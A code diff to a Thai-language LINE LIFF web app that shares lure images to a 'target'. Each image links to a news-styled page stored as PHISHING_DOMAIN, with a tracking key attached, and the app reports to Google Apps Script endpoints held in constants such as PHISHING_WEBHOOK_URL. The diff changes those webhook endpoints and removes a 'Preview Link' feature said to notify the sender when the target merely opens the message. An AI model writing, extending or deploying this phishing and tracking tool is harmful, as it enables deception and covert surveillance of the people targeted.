@@ -635,133 +635,6 @@
                 padding: 12px 15px;
             }
         }
-
-        /* เพิ่มสไตล์สำหรับสวิตช์ Toggle */
-        .toggle-switch {
-            position: relative;
-            display: inline-block;
-            width: 50px;
-            height: 24px;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-        
-        .toggle-switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        
-        .toggle-slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 24px;
-        }
-        
-        .toggle-slider:before {
-            position: absolute;
-            content: "";
-            height: 18px;
-            width: 18px;
-            left: 3px;
-            bottom: 3px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-        
-        input:checked + .toggle-slider {
-            background-color: var(--primary-color);
-        }
-        
-        input:focus + .toggle-slider {
-            box-shadow: 0 0 1px var(--primary-color);
-        }
-        
-        input:checked + .toggle-slider:before {
-            transform: translateX(26px);
-        }
-        
-        .feature-option {
-            display: flex;
-            align-items: center;
-            background-color: #f9f9f9;
-            border-radius: 8px;
-            padding: 12px 15px;
-            margin-top: 15px;
-            border: 1px solid #eee;
-            transition: var(--transition-normal);
-        }
-        
-        .feature-option:hover {
-            background-color: #f0f8ff;
-            border-color: #dae6f2;
-        }
-        
-        .feature-option .feature-text {
-            flex-grow: 1;
-        }
-        
-        .feature-option h4 {
-            margin: 0 0 5px 0;
-            font-size: 15px;
-            color: var(--text-color);
-        }
-        
-        .feature-option p {
-            margin: 0;
-            font-size: 13px;
-            color: var(--text-light);
-            line-height: 1.4;
-        }
-        
-        .feature-badge {
-            background-color: rgba(76, 175, 80, 0.15);
-            color: var(--success-color);
-            border: 1px solid rgba(76, 175, 80, 0.3);
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 10px;
-            margin-left: 5px;
-            font-weight: 500;
-        }
-
-        /* สำหรับตัวเลือกขั้นสูง */
-        .advanced-options {
-            margin-top: 20px;
-            border-top: 1px dashed #ddd;
-            padding-top: 20px;
-        }
-        
-        .advanced-options-header {
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-            color: var(--primary-color);
-            margin-bottom: 15px;
-            font-weight: 500;
-            font-size: 15px;
-        }
-        
-        .advanced-options-header i {
-            transition: var(--transition-normal);
-            margin-right: 5px;
-        }
-        
-        .advanced-options-content {
-            display: none;
-        }
-        
-        .advanced-options-content.active {
-            display: block;
-            animation: fadeIn 0.3s forwards;
-        }
     </style>
 </head>
 <body>
@@ -839,26 +712,6 @@
                 
                 <div id="statusMessage" class="status"></div>
                 
-                <div class="advanced-options">
-                    <div class="advanced-options-header" id="advancedOptionsToggle">
-                        <i class="fas fa-cog"></i> ตัวเลือกขั้นสูง
-                        <i class="fas fa-chevron-down" style="margin-left: auto;"></i>
-                    </div>
-                    
-                    <div class="advanced-options-content" id="advancedOptionsContent">
-                        <div class="feature-option">
-                            <div class="feature-text">
-                                <h4>Preview Link <span class="feature-badge">ใหม่</span></h4>
-                                <p>เมื่อเปิดใช้งาน ระบบจะแจ้งเตือนเมื่อเป้าหมายเปิดอ่านข้อความโดยไม่ต้องกดที่ลิงก์หรือรูปภาพ</p>
-                            </div>
-                            <label class="toggle-switch">
-                                <input type="checkbox" id="previewLinkToggle" checked>
-                                <span class="toggle-slider"></span>
-                            </label>
-                        </div>
-                    </div>
-                </div>
-                
                 <button class="btn btn-share" id="shareBtn" disabled>
                     <i class="fas fa-paper-plane"></i> แชร์ภาพไปยังเป้าหมาย
                 </button>
@@ -886,7 +739,6 @@
         let isLiffInitialized = false;
         let userHasPermission = false;
         let expirationStatus = ""; // เพิ่มตัวแปรเก็บวันหมดอายุ
-        let enablePreviewLink = true; // เพิ่มตัวแปรควบคุม Preview Link
         
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
@@ -894,8 +746,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwW_AzFS59jzQrsR2rSVvglxAFeku3f7RhVfj6svSYzmupmnB8jhts5ZVE061r44hoE/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwW_AzFS59jzQrsR2rSVvglxAFeku3f7RhVfj6svSYzmupmnB8jhts5ZVE061r44hoE/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1255,35 +1107,6 @@
                 }
                 document.getElementById('imageUpload').click();
             });
-
-            // เพิ่ม Event สำหรับตัวเลือกขั้นสูง
-            document.getElementById('advancedOptionsToggle').addEventListener('click', function() {
-                const content = document.getElementById('advancedOptionsContent');
-                const icon = this.querySelector('.fa-chevron-down');
-                content.classList.toggle('active');
-                icon.style.transform = content.classList.contains('active') ? 'rotate(180deg)' : 'rotate(0deg)';
-            });
-            
-            // เพิ่ม Event สำหรับสวิตช์ Preview Link
-            document.getElementById('previewLinkToggle').addEventListener('change', function() {
-                enablePreviewLink = this.checked;
-                try {
-                    localStorage.setItem('enable_preview_link', enablePreviewLink ? 'true' : 'false');
-                } catch (e) {
-                    console.error('ไม่สามารถบันทึกการตั้งค่า Preview Link:', e);
-                }
-            });
-            
-            // โหลดการตั้งค่า Preview Link จาก localStorage
-            try {
-                const savedPreviewLinkSetting = localStorage.getItem('enable_preview_link');
-                if (savedPreviewLinkSetting !== null) {
-                    enablePreviewLink = savedPreviewLinkSetting === 'true';
-                    document.getElementById('previewLinkToggle').checked = enablePreviewLink;
-                }
-            } catch (e) {
-                console.error('ไม่สามารถอ่านการตั้งค่า Preview Link:', e);
-            }
         }
         
         // จัดการรูปภาพที่เลือก
@@ -1659,9 +1482,8 @@
                 imageUrl = await uploadImage();
                 if (!imageUrl) return;
                 
-                // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image และ preview
-                const previewParam = enablePreviewLink ? '&preview=1' : '';
-                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image${previewParam}`;
+                // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
                 // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
                 const message = {
